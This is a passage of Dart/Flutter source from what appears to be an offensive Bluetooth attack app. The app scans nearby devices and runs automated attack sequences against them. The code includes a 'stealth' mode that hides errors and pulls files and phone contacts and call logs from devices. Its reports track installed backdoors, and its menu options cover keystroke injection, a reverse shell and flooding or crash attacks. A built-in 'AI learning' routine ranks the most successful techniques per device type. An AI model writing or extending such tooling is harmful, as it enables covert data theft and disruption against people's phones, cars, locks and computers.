        'strategy_score': prediction.optimalAttackStrategy.overallStrategyScore,
      };
    } catch (e) {
      return {'error': e.toString()};
    }
  }

  // Modo sigiloso - ejecutar ataques con mínima detección
  Future<void> _executeStealthMode(String address, String displayName) async {
    if (!_stealthMode) return;
    
    _appendLog('  🎭 Ejecutando en modo SIGILOSO...');
    
    const stealthAttacks = [
      {'type': 'sdp_discover', 'command': 'scan'},
      {'type': 'file_exfil', 'command': 'scan'},
      {'type': 'pbap_extract', 'command': 'contacts'},
    ];
    
    for (final attack in stealthAttacks) {
      if (!_isUnattendedRunning) return;
      
      try {
        await Future.delayed(const Duration(milliseconds: 5000));
        final result = await _exploitService.executeAttack(
          deviceAddress: address,
          type: attack['type'] as String,
          command: attack['command'] as String?,
        );
        
        if (result['success'] == true) {
          _appendLog('  🔓 ${attack['type']} completado (sigiloso)');
        }
      } catch (e) {
        // Silenciar errores
      }
    }
  }

  // Generación de reporte automático
  Future<Map<String, dynamic>> _generateAutomatedReport({
    required int totalFiles,
    required int totalContacts,
    required int totalVulns,
    required int attacksExecuted,
    required int attacksSucceeded,
  }) async {
    final patterns = _enablePatternAnalysis ? await _analyzeExtractedPatterns() : {};
    
    final report = {
      'timestamp': DateTime.now().toIso8601String(),
      'devices_processed': _devices.length,
      'total_files_extracted': totalFiles,
      'total_contacts_extracted': totalContacts,
      'total_vulnerabilities_found': totalVulns,
      'attacks_executed': attacksExecuted,
      'attacks_succeeded': attacksSucceeded,
      'success_rate': attacksExecuted > 0 ? (attacksSucceeded * 100 / attacksExecuted).toStringAsFixed(1) : '0',
      'pattern_analysis': patterns,
      'network_analysis': _networkAnalysis,
      'persistence_installed': _installedBackdoors.length,
      'stealth_mode': _stealthMode,
      'data_collected': _collectedData.length,
      'recommendations': _generateAttackRecommendations(),
    };
    
    _automatedReport = report;
    
    // Guardar reporte
    try {
      final prefs = await SharedPreferences.getInstance();
      prefs.setString('automated_report', jsonEncode(report));
    } catch (_) {}
    
    return report;
  }

  // Guardar reporte de un dispositivo específico
  Future<void> _saveDeviceReport(String address, Map<String, dynamic> report) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsKey = 'device_reports';
      final existingData = prefs.getString(reportsKey);
      final reports = existingData != null
          ? Map<String, dynamic>.from(jsonDecode(existingData))
          : <String, dynamic>{};
      reports[address] = report;
      await prefs.setString(reportsKey, jsonEncode(reports));
      _appendLog('   💾 Reporte guardado para $address');
    } catch (e) {
      _appendLog('   ⚠️ Error guardando reporte: $e');
    }
  }

  // Cargar todos los reportes guardados
  Future<Map<String, Map<String, dynamic>>> _loadAllDeviceReports() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsKey = 'device_reports';
      final existingData = prefs.getString(reportsKey);
      if (existingData == null) return {};
      final decoded = jsonDecode(existingData) as Map<String, dynamic>;
      return decoded.map((k, v) => MapEntry(k, Map<String, dynamic>.from(v as Map)));
    } catch (e) {
      return {};
    }
  }

  // Cargar reporte de un dispositivo específico
  Future<Map<String, dynamic>?> _loadDeviceReport(String address) async {
    final reports = await _loadAllDeviceReports();
    return reports[address];
  }

  // Obtener estrategia adaptativa basada en reportes previos
  Future<List<String>> _getAdaptiveStrategy(String address, String deviceType) async {
    final savedReport = await _loadDeviceReport(address);
    final allReports = await _loadAllDeviceReports();
    
    // Si hay reporte previo del dispositivo, usarlo
    if (savedReport != null) {
      final previousSuccess = savedReport['success'] as bool? ?? false;
      final previousAttacks = (savedReport['attacks'] as List?)?.cast<String>() ?? [];
      final previousFiles = savedReport['files'] as int? ?? 0;
      final previousContacts = savedReport['contacts'] as int? ?? 0;
      
      _appendLog('   📊 Reporte previo detectado');
      _appendLog('      Éxito anterior: ${previousSuccess ? "Sí" : "No"}');
      _appendLog('      Archivos: $previousFiles | Contactos: $previousContacts');
      
      if (previousSuccess && previousAttacks.isNotEmpty) {
        _appendLog('      💡 Repitiendo estrategia exitosa...');
        return previousAttacks;
      } else {
        _appendLog('      💡 Estrategia anterior falló. Probando nuevas técnicas...');
        // Agregar técnicas que no se intentaron antes
        final newAttacks = <String>['sdp', 'obex', 'pbap', 'at_injection'];
        for (final atk in previousAttacks) {
          newAttacks.remove(atk);
        }
        return newAttacks;
      }
    }
    
    // Analizar historial de otros dispositivos similares
    final similarReports = allReports.entries
        .where((e) => e.value['deviceType'] == deviceType)
        .toList();
    
    if (similarReports.isNotEmpty) {
      _appendLog('   📊 Aprendiendo de $deviceType (${similarReports.length} dispositivos)');
      
      final successfulAttacks = <String, int>{};
      for (final entry in similarReports) {
        final attacks = (entry.value['attacks'] as List?)?.cast<String>() ?? [];
        final success = entry.value['success'] as bool? ?? false;
        if (success) {
          for (final atk in attacks) {
            successfulAttacks[atk] = (successfulAttacks[atk] ?? 0) + 1;
          }
        }
      }
      
      if (successfulAttacks.isNotEmpty) {
        final sorted = successfulAttacks.entries.toList()
          ..sort((a, b) => b.value.compareTo(a.value));
        _appendLog('      📈 Técnicas exitosas: ${sorted.take(3).map((e) => "${e.key}(${e.value})").join(", ")}');
        return sorted.take(5).map((e) => e.key).toList();
      }
    }
    
    // Estrategia por defecto según tipo
    final defaultStrategy = _getOptimizedAttackSequence(deviceType);
    return defaultStrategy.map((e) => e['name'] as String? ?? e['type'] as String).toList();
  }

  // Guardar aprendizaje de la IA
  Future<void> _saveAIlearning(String deviceType, List<String> attacks, bool success) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final learningKey = 'ai_learning_$deviceType';
      final existingData = prefs.getString(learningKey);
      final learning = existingData != null
          ? Map<String, dynamic>.from(jsonDecode(existingData))
          : <String, dynamic>{
            'attempts': 0,
            'successes': 0,
            'techniques': <String, int>{},
          };
      
      learning['attempts'] = (learning['attempts'] as int? ?? 0) + 1;
      if (success) {
        learning['successes'] = (learning['successes'] as int? ?? 0) + 1;
      }
      
      final techniques = (learning['techniques'] as Map<String, dynamic>?) ?? {};
      for (final atk in attacks) {
        techniques[atk] = (techniques[atk] as int? ?? 0) + (success ? 1 : 0);
      }
      learning['techniques'] = techniques;
      
      await prefs.setString(learningKey, jsonEncode(learning));
    } catch (_) {}
  }

// Obtener estrategia basada en aprendizaje
  Future<List<Map<String, dynamic>>> _getLearnedStrategy(String deviceType) async {
    final learned = await _getLearnedTechniques(deviceType);
    
    if (learned.isEmpty) {
      // Si no hay aprendizaje, usar estrategia por defecto
      return _getOptimizedAttackSequence(deviceType);
    }
    
    // Ordenar técnicas por éxito aprendido
    final sorted = learned.entries.toList()
      ..sort((a, b) => b.value.compareTo(a.value));
    
    _appendLog('   📊 Técnicas aprendidas: ${sorted.take(5).map((e) => "${e.key}(${e.value})").join(", ")}');
    
    // Crear estrategia basada en aprendizaje
    final strategy = <Map<String, dynamic>>[];
    for (final entry in sorted) {
      // Buscar la técnica en la lista completa
      for (final atk in allAttackTechniques) {
        if (atk['name'] == entry.key) {
          strategy.add(atk);
          break;
        }
      }
    }
    
    // Agregar las que no están en aprendizaje
    for (final atk in allAttackTechniques) {
      if (!strategy.contains(atk)) {
        strategy.add(atk);
      }
    }
    
    return strategy;
  }

  // Obtener mejores técnicas aprendidas
  Future<Map<String, int>> _getLearnedTechniques(String deviceType) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final learningKey = 'ai_learning_$deviceType';
      final data = prefs.getString(learningKey);
      if (data == null) return {};
      final learning = jsonDecode(data) as Map<String, dynamic>;
      return (learning['techniques'] as Map<String, dynamic>?)
          ?.map((k, v) => MapEntry(k, v as int)) ?? {};
    } catch (_) {
      return {};
    }
  }

  // Generar recomendaciones basadas en resultados
  List<String> _generateAttackRecommendations() {
    final recommendations = <String>[];
    
    if (_pbapContacts.isEmpty && _obexFiles.isEmpty) {
      recommendations.add('Intentar técnicas de bypass de autenticación');
    }
    
    if (_sdpServices.isEmpty) {
      recommendations.add('Ejecutar SDP discovery con mayor profundidad');
    }
    
    if (_attackProbabilities.isNotEmpty) {
      final topAttack = _attackProbabilities.entries
          .reduce((a, b) => a.value > b.value ? a : b);
      recommendations.add('Priorizar ataque: ${topAttack.key} (${(topAttack.value * 100).toStringAsFixed(0)}%)');
    }
    
    if (_fullScanResults.isEmpty) {
      recommendations.add('Ejecutar escaneo completo de vulnerabilidades');
    }
    
    if (_stealthMode) {
      recommendations.add('Considerar modo normal para mayor efectividad');
    }
    
    return recommendations;
  }

  // Backoff exponencial para reintentos
  Duration _calculateBackoffDelay(int attempt) {
    final delayMs = _baseDelayMs * (_backoffMultiplier.toInt() * attempt);
    return Duration(milliseconds: delayMs.clamp(1000, 30000));
  }

  // Ejecución con reintentos y backoff
  Future<Map<String, dynamic>> _executeWithRetry({
    required String type,
    required String address,
    String? command,
    String? script,
    int maxAttempts = 3,
  }) async {
    if (type.isEmpty) return {'success': false, 'message': 'Empty type'};
    for (int attempt = 1; attempt <= maxAttempts; attempt++) {
      if (!_isUnattendedRunning) return {'success': false, 'message': 'Cancelled'};
      
      try {
        final result = await _exploitService.executeAttack(
          deviceAddress: address,
          type: type,
          command: command,
          script: script,
        );
        
        if (result['success'] == true) {
          return result;
        }
        
        _appendLog('  ⚠️ Intento #$attempt fallido, reintentando...');
      } catch (e) {
        _appendLog('  ❌ Error en intento #$attempt: $e');
      }
      
      if (attempt < maxAttempts) {
        final delay = _calculateBackoffDelay(attempt);
        await Future.delayed(delay);
      }
    }
    
    return {'success': false, 'message': 'Failed after $maxAttempts attempts'};
  }

  // Estado para persistencia
  bool _hasRestoredState = false;

  // Guía paso a paso
  int get _currentStep {
    if (_devices.isEmpty) return 0;
    // Si el dispositivo seleccionado no está en la lista actual (restaurado), mostrar paso 1
    if (_selectedDevice == null) return 1;
    if (!_devices.contains(_selectedDevice)) return 1; // Phantom device fix
    if (_executedAttacks.isEmpty) return 2;
    return 3;
  }

  String get _stepText {
    switch (_currentStep) {
      case 0: return 'PASO 1: Pulsa ESCANEAR para encontrar dispositivos';
      case 1: return 'PASO 2: Selecciona un dispositivo de la lista';
      case 2: return 'PASO 3: Elige un ataque en las pestañas de abajo';
      case 3: return 'PASO 4: Revisa datos en pestaña IA/VA';
      default: return '';
    }
  }

  Future<void> _saveState() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      if (_selectedDevice != null) {
        prefs.setString('selected_device_address', _selectedDevice!['address'] ?? '');
        prefs.setString('selected_device_name', _selectedDevice!['name'] ?? '');
      }
      prefs.setString('executed_attacks', _executedAttacks.join(','));
      
      // Save extracted results as JSON
      if (_blueBorneResults.isNotEmpty) {
        prefs.setString('blueborne_results', jsonEncode(_blueBorneResults));
      }
      if (_gattMirrorResults.isNotEmpty) {
        prefs.setString('gatt_mirror_results', jsonEncode(_gattMirrorResults));
      }
      if (_fullScanResults.isNotEmpty) {
        prefs.setString('full_scan_results', jsonEncode(_fullScanResults));
      }
      if (_atInjectionResults.isNotEmpty) {
        prefs.setString('at_injection_results', jsonEncode(_atInjectionResults));
      }
      if (_pbapContacts.isNotEmpty) {
        prefs.setString('pbap_contacts', jsonEncode(_pbapContacts));
      }
      if (_pbapCalls.isNotEmpty) {
        prefs.setString('pbap_calls', jsonEncode(_pbapCalls));
      }
      if (_sdpServices.isNotEmpty) {
        prefs.setString('sdp_services', jsonEncode(_sdpServices));
      }
      if (_obexFiles.isNotEmpty) {
        prefs.setString('obex_files', jsonEncode(_obexFiles));
      }
    } catch (_) {}
  }

  Future<void> _restoreState() async {
    if (_hasRestoredState) return;
    try {
      final prefs = await SharedPreferences.getInstance();
      final addr = prefs.getString('selected_device_address') ?? '';
      final name = prefs.getString('selected_device_name') ?? '';
      final attacks = prefs.getString('executed_attacks') ?? '';
      if (attacks.isNotEmpty) {
        _executedAttacks = attacks.split(',');
      }
      
      // Restore extracted results
      _blueBorneResults = _loadJsonList(prefs, 'blueborne_results');
      _gattMirrorResults = _loadJsonList(prefs, 'gatt_mirror_results');
      _fullScanResults = _loadJsonList(prefs, 'full_scan_results');
      _atInjectionResults = _loadJsonList(prefs, 'at_injection_results');
      _pbapContacts = _loadJsonList(prefs, 'pbap_contacts');
      _pbapCalls = _loadJsonList(prefs, 'pbap_calls');
      _sdpServices = _loadJsonList(prefs, 'sdp_services');
      _obexFiles = _loadJsonList(prefs, 'obex_files');
      
      if (addr.isNotEmpty) {
        // Solo restaurar si parece válido (MAC address real)
        if (addr.contains(RegExp(r'^[0-9A-Fa-f:]{11,}$'))) {
          _selectedDevice = {'address': addr, 'name': name, 'rssi': '0', 'isRestored': true};
          _hasRestoredState = true;
          _appendLog('💾 Estado restaurado: $name ($addr) - escanea para validar');
          if (_hasResults()) {
            _appendLog('📊 ${_collectedData.length} datos previos restaurados');
          }
        }
      }
    } catch (_) {}
  }

  List<Map<String, dynamic>> _loadJsonList(SharedPreferences prefs, String key) {
    try {
      final json = prefs.getString(key);
      if (json != null && json.isNotEmpty) {
        final list = jsonDecode(json) as List;
        return list.map((e) => Map<String, dynamic>.from(e as Map)).toList();
      }
    } catch (_) {}
    return [];
  }

  void _appendLog(String msg) {
    if (!mounted) return;
    setState(() {
      _log.add(msg);
      // Keep last 200 entries to avoid memory issues
      if (_log.length > 200) _log = _log.sublist(_log.length - 200);
    });
    // Auto-scroll to bottom
    Future.delayed(const Duration(milliseconds: 50), () {
      if (_logScrollController.hasClients) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // Mostrar reporte automático
  void _showAutomatedReport() async {
    if (_automatedReport.isEmpty) {
      _appendLog('📊 No hay reporte disponible. Ejecuta el modo automático primero.');
      return;
    }
    
    final report = _automatedReport;
    
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF0F172A),
        title: const Row(
          children: [
            Icon(Icons.assessment, color: Colors.cyanAccent),
            SizedBox(width: 8),
            Text('REPORTE AUTOMÁTICO', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            mainAxisSize: MainAxisSize.min,
            children: [
              _buildReportSection('General', [
                'Dispositivos: ${report['devices_processed']}',
                'Éxito: ${report['success_rate']}%',
                'Datos recolectados: ${report['data_collected']}',
              ]),
              _buildReportSection('Archivos', [
                'OBEX: ${report['total_files_extracted']}',
                'Apps: ${report['pattern_analysis']?['images'] ?? 0} imágenes',
                'Documentos: ${report['pattern_analysis']?['documents'] ?? 0}',
              ]),
              _buildReportSection('Contactos', [
                'Total: ${report['total_contacts_extracted']}',
                'Emails trabajo: ${report['pattern_analysis']?['work_emails']?.length ?? 0}',
                'Teléfonos: ${report['pattern_analysis']?['phone_numbers']?.length ?? 0}',
              ]),
              _buildReportSection('Red', [
                'Info extraída: ${report['network_analysis']?.length ?? 0}',
                'Persistencia: ${report['persistence_installed']}',
              ]),
              if ((report['recommendations'] as List?)?.isNotEmpty ?? false)
                _buildReportSection('Recomendaciones', 
                  (report['recommendations'] as List).cast<String>().take(5).toList()),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent)),
          ),
        ],
      ),
    );
  }

  // Mostrar reportes guardados
  void _showSavedReports() async {
    final reports = await _loadAllDeviceReports();
    
    if (reports.isEmpty) {
      _appendLog('📋 No hay reportes guardados.');
      showDialog(
        context: context,
        builder: (context) => AlertDialog(
          backgroundColor: const Color(0xFF0F172A),
          title: const Row(
            children: [
              Icon(Icons.history, color: Colors.orangeAccent),
              SizedBox(width: 8),
              Text('REPORTES GUARDADOS', style: TextStyle(color: Colors.white)),
            ],
          ),
          content: const Text(
            'No hay reportes guardados.\nEjecuta el modo automático primero.',
            style: TextStyle(color: Colors.white70),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent)),
            ),
          ],
        ),
      );
      return;
    }
    
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF0F172A),
        title: Row(
          children: [
            const Icon(Icons.history, color: Colors.orangeAccent),
            const SizedBox(width: 8),
            Text('REPORTES GUARDADOS (${reports.length})', style: const TextStyle(color: Colors.white)),
          ],
        ),
        content: SizedBox(
          width: double.maxFinite,
          height: 400,
          child: ListView.builder(
            shrinkWrap: true,
            itemCount: reports.length,
            itemBuilder: (context, i) {
              final entry = reports.entries.elementAt(i);
              final data = entry.value;
              final success = data['success'] as bool? ?? false;
              final files = data['files'] as int? ?? 0;
              final contacts = data['contacts'] as int? ?? 0;
              final attacks = (data['attacks'] as List?)?.cast<String>() ?? [];
              final timestamp = data['timestamp'] as String? ?? '';
              final deviceType = data['deviceType'] as String? ?? 'desconocido';
              
              return Card(
                color: const Color(0xFF1E293B),
                margin: const EdgeInsets.only(bottom: 8),
                child: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Icon(success ? Icons.check_circle : Icons.error, color: success ? Colors.greenAccent : Colors.redAccent, size: 16),
                          const SizedBox(width: 8),
                          Expanded(child: Text(entry.key.length > 8 ? entry.key.substring(0, 8) + '...' : entry.key, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12))),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                            decoration: BoxDecoration(color: Colors.purpleAccent.withOpacity(0.2), borderRadius: BorderRadius.circular(4)),
                            child: Text(deviceType, style: const TextStyle(color: Colors.purpleAccent, fontSize: 10)),
                          ),
                        ],
                      ),
                      const SizedBox(height: 8),
                      Text('📥 $files | 📇 $contacts', style: const TextStyle(color: Colors.white70, fontSize: 11)),
                      Text('⚔️ ${attacks.isEmpty ? "Sin ataques" : attacks.join(", ")}', style: const TextStyle(color: Colors.cyanAccent, fontSize: 10)),
                      if (timestamp.isNotEmpty) Padding(padding: const EdgeInsets.only(top: 4), child: Text('🕐 $timestamp', style: const TextStyle(color: Colors.white38, fontSize: 9))),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(onPressed: () { Navigator.pop(context); _clearAllReports(); }, child: const Text('LIMPIAR', style: TextStyle(color: Colors.redAccent))),
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent))),
        ],
      ),
    );
  }

  // Mostrar aprendizaje IA
  void _showAIlearning() async {
    final deviceTypes = ['smartphone', 'iot', 'laptop', 'car', 'wearable', 'smart_lock'];
    final allLearning = <String, Map<String, int>>{};
    
    for (final type in deviceTypes) {
      final techniques = await _getLearnedTechniques(type);
      if (techniques.isNotEmpty) allLearning[type] = techniques;
    }
    
    if (allLearning.isEmpty) {
      showDialog(
        context: context,
        builder: (context) => AlertDialog(
          backgroundColor: const Color(0xFF0F172A),
          title: const Row(children: [Icon(Icons.psychology, color: Colors.purpleAccent), SizedBox(width: 8), Text('APRENDIZAJE IA', style: TextStyle(color: Colors.white))]),
          content: const Text('No hay datos de aprendizaje.\nLa IA aprende al ejecutar ataques.', style: TextStyle(color: Colors.white70)),
          actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent)))],
        ),
      );
      return;
    }
    
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF0F172A),
        title: const Row(children: [Icon(Icons.psychology, color: Colors.purpleAccent), SizedBox(width: 8), Text('APRENDIZAJE IA', style: TextStyle(color: Colors.white))]),
        content: SizedBox(
          width: double.maxFinite,
          height: 400,
          child: ListView.builder(
            shrinkWrap: true,
            itemCount: allLearning.length,
            itemBuilder: (context, i) {
              final entry = allLearning.entries.elementAt(i);
              final techniques = entry.value;
              final sorted = techniques.entries.toList()..sort((a, b) => b.value.compareTo(a.value));
              
              return Card(
                color: const Color(0xFF1E293B),
                margin: const EdgeInsets.only(bottom: 8),
                child: Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(children: [
                        Container(padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4), decoration: BoxDecoration(color: Colors.purpleAccent.withOpacity(0.2), borderRadius: BorderRadius.circular(4)), child: Text(entry.key.toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontWeight: FontWeight.bold))),
                        const Spacer(),
                        Text('${techniques.values.fold(0, (a, b) => a + b)} éxitos', style: const TextStyle(color: Colors.greenAccent, fontSize: 10)),
                      ]),
                      const SizedBox(height: 8),
                      ...sorted.take(5).map((e) => Padding(padding: const EdgeInsets.only(bottom: 4), child: Row(children: [
                        Icon(e.value > 0 ? Icons.check_circle : Icons.cancel, color: e.value > 0 ? Colors.greenAccent : Colors.redAccent, size: 12),
                        const SizedBox(width: 8),
                        Expanded(child: Text(e.key, style: const TextStyle(color: Colors.white70, fontSize: 11))),
                        Text('${e.value}', style: const TextStyle(color: Colors.cyanAccent, fontSize: 11)),
                      ]))),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
        actions: [
          TextButton(onPressed: () { Navigator.pop(context); _clearAIlearning(); }, child: const Text('LIMPIAR', style: TextStyle(color: Colors.redAccent))),
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('CERRAR', style: TextStyle(color: Colors.cyanAccent))),
        ],
      ),
    );
  }

  void _clearAllReports() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('device_reports');
    _appendLog('🗑️ Reportes eliminados');
  }

  void _clearAIlearning() async {
    final prefs = await SharedPreferences.getInstance();
    for (final type in ['smartphone', 'iot', 'laptop', 'car', 'wearable', 'smart_lock']) {
      await prefs.remove('ai_learning_$type');
    }
    _appendLog('🗑️ Aprendizaje IA eliminado');
  }

  Widget _buildReportSection(String title, List<String> items) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: Colors.white10,
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(title, style: const TextStyle(color: Colors.cyanAccent, fontWeight: FontWeight.bold, fontSize: 12)),
          const SizedBox(height: 4),
          ...items.map((item) => Text(item, style: const TextStyle(color: Colors.white70, fontSize: 11))),
        ],
      ),
    );
  }

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 5, vsync: this);
    _initializeAI();
    _suggestionEngine.loadHistory();
    _restoreState(); // Restaurar estado si se salió por error

    // Wire service logs to terminal bar (append mode)
    RealExploitService.setExploitLogCallback((msg) => _appendLog(msg));

    // Escuchar eventos de logs reales desde el hardware (EventChannel)
    _eventSubscription = RealExploitService.eventStream.listen((event) {
      if (!mounted) return;
      final msg = event['message']?.toString();
      if (msg == null) return;
      
      if (event['type'] == 'LOG') {
        _appendLog(msg);
      } else if (event['type'] == 'VULN') {
        _appendLog('⚠️ VULN: $msg');
      } else if (event['type'] == 'GATT_READ_DUMP' || event['type'] == 'GATT_NOTIFICATION') {
        // Show GATT data captures in the log
        _appendLog('📡 [${event['type']}] $msg');
      }
    });
  }

  Future<void> _initializeAI() async {
    await _aiService.initializeAll();
    if (mounted) _appendLog('MOTOR IA ONLINE - MODELOS CARGADOS');
  }

  @override
  void dispose() {
    _tabController.dispose();
    _logScrollController.dispose();
    _aiService.dispose();
    _suggestionEngine.saveHistory();
    _eventSubscription?.cancel();
    super.dispose();
  }

  Future<void> _scan() async {
    if (mounted) {
      setState(() { _isScanning = true; _devices = []; _isStatusExpanded = false; });
    }
    _appendLog('📡 ESCANEANDO FRECUENCIAS...');
    try {
      final result = await _exploitService.startScan();
      if (mounted) {
        setState(() {
          _isScanning = false;
          if (result['success'] == true && result['devices'] != null) {
            final List rawDevices = result['devices'] as List;
            _devices = rawDevices.map((d) => Map<String, dynamic>.from(d as Map)).toList();
            if (_devices.isNotEmpty) {
              _appendLog('✅ DETECTADOS: ${_devices.length} OBJETIVOS');
              _selectedDevice = _devices.first;
              _discoveryData = { 'devices': _devices, 'services': [], 'characteristics': [] };
              _analyzeWithAI(_devices.first);
              _getSuggestion();
              _calculateSuccessRates();
            } else { _appendLog('❌ SIN SEÑALES DETECTADAS'); }
          } else { _appendLog('❌ FALLO EN ESCANEO: ${result['message']}'); }
        });
      }
    } catch (e) { 
      if (mounted) {
        setState(() => _isScanning = false);
        _appendLog('💥 ERROR CRÍTICO: $e');
      }
    }
  }

  void _calculateSuccessRates() {
    final rates = <String, double>{};
    for (var type in ['hid', 'btlejack', 'dos']) {
      final stats = _suggestionEngine.getStatsForType(type);
      // Show real success rate, or 0.5 (unknown) if no history
      rates[type] = stats.total > 0 ? stats.successRate / 100.0 : 0.5;
    }
    if (mounted) setState(() => _successRates = rates);
  }

  Future<void> _analyzeWithAI(Map<String, dynamic> device) async {
    try {
      final analysis = await _aiService.identifyAndOptimize(device);
      if (mounted) {
        setState(() { 
          _aiPrediction = 'IA: ${analysis['recommendedAttack']} (${analysis['successProbability']}%)'; 
          _calculateSuccessRates(); 
        });
      }
    } catch (e) { if (mounted) setState(() => _aiPrediction = 'IA: NO DISPONIBLE'); }
  }

  void _getSuggestion() {
    if (_selectedDevice == null) return;
    if (mounted) {
      setState(() => _currentSuggestion = _suggestionEngine.suggestNextAttack(
        deviceType: _getDeviceType(_selectedDevice!),
        deviceName: _selectedDevice!['name'] ?? 'Unknown',
        excludedTypes: _executedAttacks
      ));
    }
  }

  // Guía rápida del ataque sugerido
  String _getQuickGuide() {
    if (_currentSuggestion == null) return 'Toca RADAR → ESCANEAR → selecciona dispositivo';
    final type = _currentSuggestion!.type;
    final cmd = _currentSuggestion!.command ?? '';
    String tab = 'IA/VA';
    if (type == 'btlejack') tab = 'BTLE';
    if (type == 'dos') tab = 'DOS';
    if (type == 'hid' || type == 'hid_script') tab = 'HID';
    if (type == 'sdp_discover' || type == 'sdp' || type == 'bypass' || type == 'blueborne' || type == 'full_scan') tab = 'IA/VA';
    if (type == 'file_exfil' || type == 'obex_scan' || type == 'pbap_extract') tab = 'IA/VA';
    
    // Mapear comando interno a etiqueta del botón visible
    String btnLabel = cmd;
    if (cmd == 'notepad') btnLabel = 'WINDOWS: NOTEPAD';
    if (cmd == 'wifi') btnLabel = 'WINDOWS: WIFI';
    if (cmd == 'terminal') btnLabel = 'MACOS: TERMINAL';
    if (cmd == 'reverse') btnLabel = 'LINUX: REVERSE';
    if (cmd == 'gatt_flood') btnLabel = 'GATT FLOOD';
    if (cmd == 'l2cap_flood') btnLabel = 'L2CAP FLOOD';
    if (cmd == 'mtu_crash') btnLabel = 'MTU CRASH';
    if (cmd == 'quick_connect') btnLabel = 'QUICK CONNECT RACE';
    if (cmd == 'scan' && type == 'sdp_discover') btnLabel = 'SDP DISCOVER';
    if (cmd == 'contacts' && type == 'pbap_extract') btnLabel = 'EXTRAER CONTACTOS';
    
    return '▶ Toca aquí → ir a $tab → "$btnLabel"';
  }

  // Navegar a la pestaña sugerida al tocar el hint
  void _navigateToSuggestion() {
    if (_currentSuggestion == null) return;
    final type = _currentSuggestion!.type;
    int tabIndex = 4; // default IA/VA
    if (type == 'btlejack') tabIndex = 2;
    if (type == 'dos') tabIndex = 3;
    if (type == 'hid' || type == 'hid_script') tabIndex = 1;
    // Advanced exploits también van a IA/VA
    _tabController.animateTo(tabIndex);
  }

  // Procesar un dispositivo en modo desatendido
  Future<Map<String, dynamic>> _processDeviceUnattended(Map<String, dynamic> device, int index, int total) async {
    final displayName = device_utils.getDeviceDisplayName(device);
    final address = device['address'] ?? '';
    final deviceType = device_utils.detectDeviceType(device).toLowerCase();

    _appendLog('');
    _appendLog('═══════════════════════════════════');
    _appendLog('🎯 OBJETIVO $index/$total: $displayName');
    _appendLog('📍 MAC: $address');
    _appendLog('📱 Tipo detectado: $deviceType');
    _appendLog('═══════════════════════════════════');

    setState(() {
      _selectedDevice = device;
      _executedAttacks = [];
    });

    int deviceFiles = 0;
    int deviceContacts = 0;
    int deviceAppData = 0;
    final deviceAttacks = <String>[];
    final deviceResults = <String, dynamic>{};

    // ===== FASE 0: PREDICCIÓN CON IA =====
    if (_enableAdaptiveIntelligence && _selectedDevice != null) {
      _appendLog('🧠 FASE 0: PREDICCIÓN CON IA');
      try {
        final prediction = await _predictVulnerabilities(address);
        if (prediction.isNotEmpty) {
          final successProb = prediction['success_probability'] ?? 0.0;
          final highRisk = prediction['high_risk_vulns'] as List? ?? [];
          _appendLog('   📊 Probabilidad de éxito: ${(successProb * 100).toStringAsFixed(1)}%');
          _appendLog('   ⚠️ Vulnerabilidades de alto riesgo: ${highRisk.length}');
          if (highRisk.isNotEmpty) {
            _appendLog('   🎯 Objetivos prioritarios: ${highRisk.take(3).join(", ")}');
          }
          deviceResults['prediction'] = prediction;
        }
      } catch (e) {
        _appendLog('   ⚠️ Predicción IA no disponible: $e');
      }
    }

    // ===== EJECUCIÓN ADAPTATIVA DE ATAQUES =====
    List<Map<String, dynamic>> attackSequence;
    
    if (_enableAdaptiveIntelligence) {
      // Intentar obtener estrategia basada en reportes previos
      final savedReport = await _loadDeviceReport(address);
      if (savedReport != null && savedReport['success'] == true) {
        _appendLog('   📊 Usando estrategia previa exitosa...');
        // Usar estrategia por defecto pero priorizada por éxito anterior
        attackSequence = _getOptimizedAttackSequence(deviceType);
      } else {
        // Usar estrategia aprendida de otros dispositivos similares
        attackSequence = await _getLearnedStrategy(deviceType);
      }
    } else {
      attackSequence = _getOptimizedAttackSequence(deviceType);
    }

    _appendLog('📋 Secuencia: ${attackSequence.length} técnicas');
    
    // Guardar deviceType en results para aprendizaje futuro
    deviceResults['deviceType'] = deviceType;

    // ===== EJECUTAR TODOS LOS EXPLOITS DE LA ESTRATEGIA =====
